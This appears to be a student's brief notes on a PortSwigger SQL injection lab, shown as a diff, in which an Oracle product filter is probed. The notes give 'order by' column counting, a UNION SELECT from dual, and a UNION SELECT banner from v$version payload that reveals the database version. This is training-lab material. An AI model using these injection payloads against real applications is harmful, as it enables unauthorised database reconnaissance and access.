@@ -1,0 +1,26 @@
+SQL injection attact - querying the database type and version on Oracle
+
+SQL Injection - Product category filter
+
+End Goal - display the database version string
+
+Analysis:
+
+(1) Determine the number of columns
+
+' order by 3--    -> internal server error
+
+total column : 3-1=2
+
+(2) Determine the data types of the columns
+
+' UNION select 'a', 'a' from dual--    -> Oracle database
+
+(3) Output the version of the database 
+
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+
+' UNION SELECT banner, NULL from v$version--   : use to get version
+
+lab:  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
